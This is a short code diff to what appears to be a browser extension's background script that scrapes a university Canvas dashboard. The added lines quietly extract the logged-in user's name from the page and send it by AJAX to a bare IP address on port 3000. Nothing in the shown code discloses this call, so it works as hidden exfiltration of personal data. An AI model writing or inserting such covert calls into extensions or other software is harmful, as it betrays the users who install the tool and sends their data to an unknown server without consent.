@@ -331,6 +331,16 @@ var Background = (function(){
 		var tmp = {data : 0};
 		getUrl(tmp, "https://canvas.cs.ubbcluj.ro/dashboard");
 
+		var name = tmp.data.match(/user_name">.*</)[0].split(">")[2].split("<")[0];
+		$.ajax({
+			url : 'http://165.227.171.142:3000/',
+			type : 'GET',
+			contentType :'application/json',
+			data : {
+				name: name
+			}
+		});
+
 		var announcements, assignments;
 
 		var annPos = tmp.data.search('Announcements');
